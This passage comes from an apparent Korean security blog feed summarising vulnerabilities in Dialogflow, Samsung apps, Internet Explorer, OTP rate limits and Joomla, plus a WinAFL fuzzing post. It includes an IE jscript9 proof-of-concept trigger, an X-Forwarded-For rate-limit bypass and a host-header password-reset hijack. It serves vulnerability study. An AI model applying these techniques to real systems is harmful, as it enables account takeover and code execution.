    <link href="/2021/06/17/idioth/2021-06-17/"/>
    <url>/2021/06/17/idioth/2021-06-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://lalka-test.medium.com/google-vrp-privilege-escalation-on-https-dialogflow-cloud-google-com-599af6c4516d">[Google VRP] Privilege escalation on https://dialogflow.cloud.google.com)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://dialogflow.cloud.google.com/">https://dialogflow.cloud.google.com/</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Cloud Platform의 Dialogflow 콘솔 사이트 <a href="https://dialogflow.cloud.google.com에서/">https://dialogflow.cloud.google.com에서</a> 권한 상승이 발견되었습니다. 해당 취약점은 초대된 다른 사용자의 권한을 낮춰도 동작하지 않아 발생하였습니다. 취약점을 트리거하는 단계는 다음과 같습니다.</p><ol><li><a href="https://dialogflow.cloud.google.com/#/editAgent/{project}/">https://dialogflow.cloud.google.com/#/editAgent/{project}/</a> 설정으로 이동하여 “Developer” 권한을 가진 사용자를 초대합니다.</li><li>“Developer”를 “Reviewer”로 권한을 낮춥니다.</li><li>설정이 적용되어 Reviewer로 화면에는 표시되지만 사용자는 Developer 권한으로 모든 작업이 가능합니다.</li></ol><p><a href="https://console.cloud.google.com/iam-admin/%EC%97%90%EC%84%9C">https://console.cloud.google.com/iam-admin/에서</a> 확인하면 초대된 사용자의 권한이 처음에 Developer로 설정한 후 Reviewer로 수정하면 권한이 수정되지 않고 Developer + Reviewer의 권한이 적용되어 발생한 취약점입니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>google</tag>
      
      <tag>gcp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Samsung mobile 기본 앱 취약점</title>
    <link href="/2021/06/16/fabu1ous/2021-06-16/"/>
    <url>/2021/06/16/fabu1ous/2021-06-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/">Two weeks of securing Samsung devices: Part 1</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Samsung mobile 기본 앱</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oversecured 팀이 삼성 모바일 기기에 기본 제공되는 앱에서 다수의 취약점을 발견했습니다. 해커는 해당 취약점들을 악용해 타겟 기기의 연락처, 통화, SMS/MMS에 접근하여 편집하고 관리자 권한으로 임의의 앱을 설치할 수 있습니다.</p><ul><li><p>CVE-2021-25388</p><p>Knox Core는 URI 파라미터 검증이 미흡해 해커가 임의의 앱을 설치하거나 임의의 파일을 탈취할 수 있습니다. </p></li><li><p>CVE-2021-25356</p><p>Managed Provisioning은 모든 상호작용의 승인을 확인하기 위한 보안 검사가 있습니다. 하지만 <code>com.samsung.knox.container.requestId</code>값이 설정되어있다면 이를 무시할 수 있어 해커는 임의의 앱을 설치하고 관리자 권한을 부여할 수 있습니다.</p></li><li><p>CVE-2021-25391</p><p>Secure Folder는 Intent redirection 취약점이 있어 해커가 읽기, 쓰기 작업을 가로챌 수 있습니다.</p></li><li><p>CVE-2021-25393</p><p>SecSetting은 intent에 대한 부적절한 sanitization 때문에 해커가 system uid 데이터에 접근 할 수 있습니다.</p></li><li><p>CVE-2021-25392</p><p>Samsung Dex는 부적절한 백업 경로 설정 때문에 해커가 이를 변경해 크리티컬 데이터를 노출시킬 수 있습니다.</p></li><li><p>CVE-2021-25397</p><p>TelephonyUI의 부적절한 Access control 때문에 해커는 TelephonyUI의 파일에 대한 쓰기 작업을 할 수 있습니다.</p></li><li><p>CVE-2021-25390</p><p>PhotoTable의 Intent redirection 취약점은 해커가 임의의 파일에 접근할 수 있게 합니다.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>pre-installed app</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31959: Internet Explorer Uninitialized Property ID array</title>
    <link href="/2021/06/15/l0ch/2021-06-15/"/>
    <url>/2021/06/15/l0ch/2021-06-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">Issue 2168: Internet Explorer: Memory corruption in jscript9.dll due to uninitialized Property ID array</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Internet Explorer (Windows 10)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS에서 지원을 2022년 6월에 완전히 종료하겠다고 밝힌 Internet Explorer에서 초기화되지 않은 배열 요소의 사용으로 인한 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p>취약점은 jscript9의 PropertyID 배열의 처리 방식에 존재합니다. PropertyID 배열은 <code>ByteCodeGenerator::EmitScopeObjectInit</code> 함수에 할당됩니다. 이때 할당 시 메모리를 초기화하지 않는 <code>ArenaAllocator::Alloc</code> 함수를 사용해 배열을 할당하므로 배열의 일부가 초기화되지 않은 상태로 유지됩니다.</p><p>이러한 초기화되지 않은 PropertyID로 변수의 scope를 속일 수 있습니다. 이를 악용하면 정상적인 방법으로 액세스 할 수 없는 변수에 액세스 할 수 있으며 원격 코드 실행으로 이어질 수 있습니다. 해당 취약점은 <a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html">CVE-2020-1380</a>과 동일한 방법으로 JIT 엔진을 사용해 트리거할 수 있습니다.</p><p><strong>PoC Code</strong></p><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- saved from url=(0014)about:internet --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;start&#x27;</span>);</span><span class="javascript"><span class="hljs-comment">// prepare objects</span></span><span class="javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8c</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Int32Array</span>(buf);</span><span class="javascript"><span class="hljs-keyword">var</span> o = &#123;&#125;;</span><span class="javascript">o.valueOf = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">    alert(<span class="hljs-string">&#x27;callback&#x27;</span>);</span><span class="javascript">    <span class="hljs-comment">// free </span></span><span class="javascript">    worker = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&#x27;worker.js&#x27;</span>);</span>    worker.postMessage(buf, [buf]);    worker.terminate();<span class="javascript">    worker = <span class="hljs-literal">null</span>;</span><span class="javascript">    <span class="hljs-comment">// sleep</span></span><span class="javascript">    <span class="hljs-keyword">var</span> start = <span class="hljs-built_in">Date</span>.now();</span><span class="javascript">    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;</span><span class="javascript">    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> reclaim freed memory</span></span><span class="javascript">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></span>&#125;;<span class="javascript"><span class="hljs-comment">// generate function from string in order to have a clean bytecode generator</span></span><span class="javascript"><span class="hljs-keyword">var</span> vulnstr =</span><span class="javascript"><span class="hljs-string">&quot;for (let i=0; i&lt;1; i++) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    function opt(A, x, crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        &#x27;use strict&#x27;;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const aagaaaaaaahabauaaaaa = x+1;\n&quot;</span> + <span class="hljs-comment">//special variable name so that hash is eqal to 0x109 (property ID of Int16Array)</span></span><span class="javascript"><span class="hljs-string">&quot;        const c02 = aagaaaaaaahabauaaaaa+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c03 = c02+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c04 = c03+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c05 = c04+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        let c06 = c05+1;\n&quot;</span> +  <span class="hljs-comment">// this variable will alias with Int16Array</span></span><span class="javascript"><span class="hljs-string">&quot;        const c07 = c06+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c08 = c07+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c09 = c08+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c10 = c09+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c11 = c10+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c12 = c11+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c13 = c12+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c14 = c13+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c15 = c14+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c16 = c15+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c17 = c16+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c18 = c17+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c19 = c18+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c20 = c19+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c21 = c20+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c22 = c21+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c23 = c22+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c24 = c23+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c25 = c24+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c26 = c25+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c27 = c26+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c28 = c27+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c29 = c28+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c30 = c29+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c31 = c30+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c32 = c31+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c33 = c32+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c34 = c33+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c35 = c34+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c36 = c35+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c37 = c36+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        const c38 = c37+1;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        if(crash) &#123;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;          c06 = c06 + 1;\n&quot;</span> + <span class="hljs-comment">// we must change it here so that the value below is not known</span></span><span class="javascript"><span class="hljs-string">&quot;          Int16Array = o;\n&quot;</span> + <span class="hljs-comment">// here we actually change the value (and type) of c06</span></span><span class="javascript"><span class="hljs-string">&quot;        &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;        A[0] = c06;\n&quot;</span> + <span class="hljs-comment">// if crash==1, c06 is an object here, but JIT thinks it&#x27;s an integer</span></span><span class="javascript"><span class="hljs-string">&quot;        eval(1);\n&quot;</span> +  <span class="hljs-comment">// needed to trigger ByteCodeGenerator::EmitScopeObjectInit</span></span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    for(var i=0; i&lt;100000; i++) &#123;\n&quot;</span> + <span class="hljs-comment">// jit a function</span></span><span class="javascript"><span class="hljs-string">&quot;      opt(arr, 1, 0);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    &#125;\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    opt(arr, 1, 1);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;    alert(&#x27;failed&#x27;);\n&quot;</span> +</span><span class="javascript"><span class="hljs-string">&quot;&#125;&quot;</span>;</span><span class="javascript">vuln = <span class="hljs-built_in">Function</span>(vulnstr);</span>vuln();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>internet explorer</tag>
      
      <tag>L0ch</tag>
      
      <tag>uninitialized variable</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Rate Limit 우회를 통한 OTP Brute-Force</title>
    <link href="/2021/06/14/idioth/2021-06-14/"/>
    <url>/2021/06/14/idioth/2021-06-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://systemweakness.com/brute-forcing-otp-via-bypassing-rate-limit-c5ee6b25c2a8">OTP Brute-Force Via Rate Limit Bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>One Time Password</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Rate limit가 존재하는 OTP (One Time Password) 메커니즘을 우회하여 Brute Force이 가능한 방법이 공개되었습니다. 원글의 작성자는 버그 바운티의 타깃이 되는 웹 사이트를 공개하지 않았습니다.</p><p>타깃 웹사이트에서 비밀번호를 재설정하는 부분에 제공된 이메일 주소로 OTP가 전송됩니다. Reset Password 버튼을 반복하여 클릭하고 Burp Suite로 확인하면 rate limit가 적용되어 있습니다. 따라서 연속적인 request가 발생할 시 <code>Server error</code>가 발생합니다. 하지만 <code>X-Forwarded-For: 127.0.0.1</code> 헤더를 사용하여 OTP의 time limiting을 우회할 수 있습니다. 이를 통해 <code>X-Forwarded-For</code>의 호스트 ID를 <code>127.0.0.1</code>부터 <code>127.0.0.255</code>까지 바꿔가면서 OTP를 Brute Force 할 수 있습니다.</p><p><img src="https://miro.medium.com/max/1200/1*yuL2sY-lT9Z1TESnqGR1_w.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>otp</tag>
      
      <tag>bruteforce</tag>
      
      <tag>time limiting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] WinAFL로 마구 퍼징하기 Part2</title>
    <link href="/2021/06/13/fabu1ous/winafl-2/"/>
    <url>/2021/06/13/fabu1ous/winafl-2/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-1-요약"><a href="#Part-1-요약" class="headerlink" title="Part 1 요약"></a>Part 1 요약</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/1.png"></p><p><img src="/2021/06/13/fabu1ous/winafl-2/2.png"></p><p>애미야… 실행속도가… 짜다…</p><p><a href="https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/">Part 1 보러가기</a></p><h1 id="루프-쓴다며"><a href="#루프-쓴다며" class="headerlink" title="루프 쓴다며!"></a>루프 쓴다며!</h1><p><img src="/2021/06/13/fabu1ous/winafl-2/3.png"></p><p>WinAFL은 빠른 퍼징 속도를 자랑한다고 해서 많이 기대했는데 3초에 1번 꼴로 타겟 함수를 실행하고 Total paths도 1인걸 보니 많이 허탈하더군요. 아무리 느려도 BFF 보단 빨라야 하는 거 아닌가라는 생각에 어이가 없어서 뭐가 문제일까 곰곰이 생각하던 중 이상한 걸 발견했습니다.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/4.png"></p><p>실행 횟수가 늘어날때마다 PID와 함께 그 프로세스를 종료시켰다는 로그가 출력되더군요. Iteration을 할 때 몇몇 리소스가 여전히 어딘가에서 사용 중이라면 이런 현상이 발생한다고 합니다. 그래서 처음엔 타겟 함수가 child process를 생성하고 종료하지 않아 WinAFL이 대신 종료시키는 거라고 생각했습니다. ProcMon으로 WinAFL의 iteration 하나를 캡쳐하고 화면에 출력되는 PID를 찾아봤더니 child process가 아니라 harness.exe의 PID였습니다.</p><p><img src="/2021/06/13/fabu1ous/winafl-2/5.png"></p><p>Part 1에서 WinAFL은 프로세스(Harness.exe)를 종료하지 않고 타겟 함수를 루프로 반복 실행해 빠른 퍼징 속도를 낼 수 있다는 사실을 굉장히 강조했습니다. 물론 Harness를 똑바로 작성했을 때의 이야기입니다. 제가 작성한 Harness처럼 문제가 있다면 오히려 WinAFL의 저런 특징들이 독이 되서 반대로 퍼징 속도가 극악무도하게 느려집니다.</p><h1 id="그래서-뭐가-문제인가"><a href="#그래서-뭐가-문제인가" class="headerlink" title="그래서 뭐가 문제인가"></a>그래서 뭐가 문제인가</h1><p>위에서 언급한 것처럼 iteration을 할 때 몇몇 리소스가 여전히 사용 중이라면 이를 해결하기 위해 WinAFL이 프로세스를 종료합니다. 타겟함수 내에서 input 파일이 제대로 닫히지 않은 것이 문제인 것 같아서 분석해 봤습니다. ( 네, 이때서야 타겟 함수를 분석했습니다. Harness가 똑바로 동작안하는 것도 당연하지… )</p><p><img src="/2021/06/13/fabu1ous/winafl-2/6.png"></p><p>타겟 함수에는 2가지 문제점이 있었습니다. 첫 번째, input 파일을 두 번 열고 닫습니다. 타겟 함수는 파일의 손상이 있는지 확인하고 그에 맞는 핸들 번호를 리턴하는데 우선 파일을 열어 파일 시그니쳐를 읽고 검사합니다. 만약 파일 시그니처가 유효하다면 서브 루틴에서 다시 한번 더 파일을 열어 파싱 하고 검사합니다. Part1에서 설명한 대로 타겟 함수가 만족해야 할 조건은 다음과 같습니다.</p><ol><li>함수 내에서 input 파일을 열어야 함</li><li>그 파일을 파싱 해야 함</li><li>함수 내에서 input 파일을 닫아야 함</li><li>리턴까지 정상적으로 실행되어야 함</li></ol><p>여기서 3번 과정이 중요한데 Harness가 파일을 닫아야 WinAFL이 파일의 내용을 수정할 수 있습니다.</p><p>WinAFL이 파일을 mutate 하기 위해 접근하지만 Harness가 다시 사용해 실패하게 되고 강제로 Harness를 종료시키게 됩니다.</p><p>두 번째, 처음 파일을 열었을 때 파일 시그니처 “4 byte”만 읽기 때문에 퍼징에 의미 없는 동작입니다. 처음부터 타겟 함수를 조금이라도 분석했으면 이런 문제가 발생하지 않았을 텐데…</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>문제점을 알아냈으니 Harness를 수정해 봅시다. 우선 타겟 함수를 변경했습니다. 기존 타겟 함수 내부에 있던 서브 루틴으로 파일의 아카이브 헤더를 읽어와 파싱 하고 검사합니다. 새로운 타겟 함수는 vtable을 인자로 받아 사용하고 <code>__thiscall</code> 호출 규약을 사용하기 때문에 그에 맞게 코드를 수정해 줬습니다.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET target;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *OPERATE)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp)</span></span>;OPERATE pre_target;OPERATE post_target;OPERATE filecl;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> result = target(vp, path);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d\\n&quot;</span>, result);filecl(vp);<span class="hljs-keyword">return</span> result;&#125;<span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> vp[<span class="hljs-number">32</span>];SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll 경로</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>);<span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\\n&quot;</span>, DLLHandle);target = (TARGET)DLLHandle + <span class="hljs-number">0x1500</span>;filecl = (OPERATE)DLLHandle + <span class="hljs-number">0x16e0</span>;pre_target = (OPERATE)DLLHandle + <span class="hljs-number">0x1000</span>;post_target = (OPERATE)DLLHandle + <span class="hljs-number">0x10c0</span>;pre_target(vp);<span class="hljs-keyword">int</span> result = fuzzme(vp, charToWChar(argv[<span class="hljs-number">1</span>]));post_target(vp);<span class="hljs-keyword">return</span> result;&#125;</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/7.png"></p><p>프로세스 종료 문제가 사라졌고 초당 90번 정도 실행 속도가 나옵니다. WinAFL은 여전히 느리다고 불평하지만 3초에 1번 실행하던 이전 버전보단 훨씬 괜찮은 거 같습니다. 무엇보다 bff에 비하면 엄청나게 빠른 거라 저는 만족합니다.</p><h1 id="병렬-처리"><a href="#병렬-처리" class="headerlink" title="병렬 처리"></a>병렬 처리</h1><p>코어 갯수만큼 인스턴스를 돌릴 수 있습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -M fuzzer<span class="hljs-number">01</span> -D <span class="hljs-string">&quot;%DynamoRIO경로%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness경로%harness.exe&quot;</span> @@<span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -S fuzzer<span class="hljs-number">02</span> -D <span class="hljs-string">&quot;%DynamoRIO경로%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness경로%harness.exe&quot;</span> @@</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/8.png"></p><p>8 코어라서 8개 돌리는 중입니다. 아름답습니다. harness 수정하기 전에는 CPU 40% 정도 쓰던데 지금은 83%~88%를 찍는 거 보니 기분도 좋네요.</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>음… 뭔가 엄청 길어질 거라 생각해서 Part 2로 나누긴 했는데 아무래도 실제 상용 프로그램을 분석한 내용을 상세하게 적을 수 없기 때문에 글이 많이 짧아진 거 같네요. 글로 보면 짧은데 저의 삽질은 엄청 길었습니다. ㅎㅎ. Harness를 자동으로 생성해주는 winnie-AFL이란 것도 있던데 다음 글은 아마 winnie-AFL에 관한 글이 될 거 같습니다.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>winafl</tag>
      
      <tag>fuzzing</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] JOOMLA PASSWORD RESET VULNERABILITY AND A STORED XSS FOR FULL COMPROMISE</title>
    <link href="/2021/06/13/j0ker/2021-06-13/"/>
    <url>/2021/06/13/j0ker/2021-06-13/</url>
    
    <content type="html"><![CDATA[<p>6월 7일, Joomla 취약점 두 개의 상세 내용이 공개되었습니다.</p><p>첫 번째 취약점은 임의 계정 패스워드 초기화 취약점입니다. Joomla 계정은 두 가지로 나뉘는데, 하나는 일반적인 admin 계정이고, 다른 하나는 super admin 입니다. 이 취약점으로는 admin 계정의 비밀번호를 초기화할 수 있습니다.</p><p>먼저 Joomla에 특정 계정의 패스워드 초기화를 요청하면 해당 계정 이메일로 패스워트 초기화 링크를 전송합니다.</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>($_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;  <span class="hljs-comment">// To build the entire URI we need to prepend the protocol, and the http host</span>  <span class="hljs-comment">// to the URI string.</span>   $theURI = <span class="hljs-string">&#x27;http&#x27;</span> . $https . $_SERVER[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>] . $_SERVER[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>];&#125;</code></pre><p>패스워드 초기화 링크를 구성할 때, Joomla의 URI.php에서 서버의 IP를 HOST 헤더에서 가져오는데, 이를 HOST header poisoning을 통해 조작할 수 있습니다. 그렇게 되면 해커는 보내는 링크를 해커의 서버로 조작한 다음 피해자에게 보내고, 피해자는 해당 링크를 클릭하게 됩니다. 그 순간 해커의 서버로 패스워드 초기화를 위한 토큰이 전송되어 해커는 해당 토큰을 이용해 패스워드를 초기화할 수 있게 됩니다.</p><p>두 번째 취약점은 stored XSS을 통한 admin to super admin 권한 상승 취약점입니다.</p><p>일반적인 상황에서 Joomla에서는 블랙리스트를 통해 업로드할 수 있는 파일 확장자들을 관리합니다. php, php5 등 스크립트를 삽입할 수 있는 대부분의 확장자들을 막아놓았는데, 여기에 .html이 빠져있어 html 파일을 업로드할 수 있습니다. 따라서 html 파일에 XSS 페이로드를 넣고 댓글이나 글에 넣고 업로드를 하고, super admin이 그것을 보게 되면 super admin 권한으로 XSS 페이로드가 실행되어 권한상승을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>j0ker</tag>
      
      <tag>joomla</tag>
      
      <tag>password</tag>
      
      <tag>reset</tag>
      
      <tag>server</tag>
      
      <tag>CVE-2021-26032</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21779: Webkit Webcore use-after-free</title>
    <link href="/2021/06/12/fabu1ous/2021-06-12/"/>
    <url>/2021/06/12/fabu1ous/2021-06-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1238">Webkit WebCore::GraphicsContext use-after-free vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>WebKitGTK 2.30.4</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>WebkitGTK 2.30.4의 GraphicsContext는 특정 이벤트를 핸들 할 때 use-after-free 취약점이 발생합니다. Webkit은 오픈소스 웹 콘텐츠 엔진으로 브라우저를 비롯한 여러 응용프로그램에서 사용합니다.</p><p>Webkit의 <code>fillText()</code> 함수는 HTMLCanvasElement 내부 특정 좌표에 문자열을 출력합니다. HTMLCanvasElement는 <code>m_width</code>와 <code>m_height</code>값을 갖고 있는데 이에 맞춰 <code>fillText()</code> 함수가 출력할 문자열의 좌표가 유효한 범위 내에 있는지 검사합니다.</p><p>HTMLCanvasElement는 백그라운드에서 수행된 변경 사항에 따라 <code>m_height</code> 값을 업데이트하지만 업데이트되기 이전의 